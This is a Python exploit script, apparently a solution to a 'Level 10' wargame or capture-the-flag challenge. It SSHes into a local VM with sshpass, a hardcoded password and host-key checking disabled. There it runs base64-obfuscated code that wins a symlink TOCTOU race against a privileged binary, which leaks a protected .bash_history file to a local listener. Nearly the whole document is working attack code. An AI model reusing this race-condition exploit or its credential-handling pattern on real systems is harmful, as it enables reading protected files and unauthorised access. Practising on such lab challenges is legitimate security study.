"""Level 10 TOCTOU Race Condition Exploit - All-in-One"""

import subprocess
import sys
import tempfile
import os
import base64


def main():
    print("[*] Level 10 TOCTOU Race Condition Exploit")
    print("[*] Connecting to VM and running exploit...\n")

    remote_code = b"""import socket, subprocess, os, sys, time, threading
TARGET_FILE = '/home/user/level10/.bash_history'
DUMMY_FILE = 'dummy_file'
LINK_FILE = 'link'
LEVEL10_BINARY = '/home/user/level10/level10'
TARGET_HOST = '127.0.0.1'
TARGET_PORT = 6969
received_data = []
def listen_for_data():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((TARGET_HOST, TARGET_PORT))
        s.listen(1)
        s.settimeout(5)
        conn, addr = s.accept()
        data = conn.recv(4096)
        received_data.append(data)
        conn.close()
        s.close()
    except: pass
def run_exploit():
    os.chdir('/var/tmp')
    sys.stderr.write('[*] Setting up TOCTOU race condition exploit...\\n')
    try:
        f = open(DUMMY_FILE, 'w')
        f.write('dummy_content\\n')
        f.close()
    except: pass
    try: os.unlink(LINK_FILE)
    except: pass
    sys.stderr.write('[*] Starting listener on port 6969...\\n')
    listener_thread = threading.Thread(target=listen_for_data)
    listener_thread.daemon = True
    listener_thread.start()
    time.sleep(1)
    sys.stderr.write('[*] Starting race condition attempts (this may take a moment)...\\n')
    for attempt in range(2000):
        if attempt % 50 == 0:
            pct = (attempt * 100) // 2000
            sys.stderr.write('[*] Progress: %d/2000 (%d%%) - Still trying to win race condition...\\n' % (attempt, pct))
        received_data[:] = []
        try: os.unlink(LINK_FILE)
        except: pass
        try: os.symlink(DUMMY_FILE, LINK_FILE)
        except: continue
        try:
            p = subprocess.Popen([LEVEL10_BINARY, LINK_FILE, TARGET_HOST], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except: continue
        for i in range(3000):
            try: os.unlink(LINK_FILE)
            except: pass
            try: os.symlink(TARGET_FILE, LINK_FILE)
            except: pass
        p.wait()
        if received_data:
            data = received_data[0]
            if isinstance(data, str): data_str = data
            else: data_str = data.decode('utf-8', errors='ignore')
            if len(data_str) > 5 and 'woupa2' in data_str:
                sys.stderr.write('[+] Race condition won on attempt %d!\\n' % attempt)
                return data_str
    sys.stderr.write('[-] Failed to win race condition after 2000 attempts\\n')
    return None
result = run_exploit()
if result: print(result)
else:
    sys.stderr.write("FAILED\\n")
    sys.exit(1)
"""

    encoded_code = base64.b64encode(remote_code).decode()

    try:
        with open("level09/flag") as f:
            level10_password = f.read().strip()
    except:
        level10_password = "s5cAJpM8ev6XHw998pRWG728z"

    try:
        cmd = f"python -c \"import base64; exec(base64.b64decode('{encoded_code}'))\""

        print("[*] Starting SSH connection...")
        print("[*] Executing race condition exploit on remote VM...")
        print("[*] This may take 5+ minutes, output will appear below:\n")

        result = subprocess.run(
            [
                "sshpass",
                "-p",
                level10_password,
                "ssh",
                "-o",
                "StrictHostKeyChecking=no",
                "-p",
                "4242",
                "level10@localhost",
                cmd,
            ],
            text=True,
            timeout=600,
        )

        if result.returncode == 0:
            print("\n[+] Exploit completed successfully!")
            return 0
        else:
            print("\n[-] Exploit failed or timed out")
            print("[*] Try running again: python3 exploit.py")
            return 1

    except subprocess.TimeoutExpired:
        print("[-] Timeout - exploit took too long")
        return 1
    except Exception as e:
        print("[-] Error: %s" % str(e))
        return 1


if __name__ == "__main__":
    sys.exit(main())
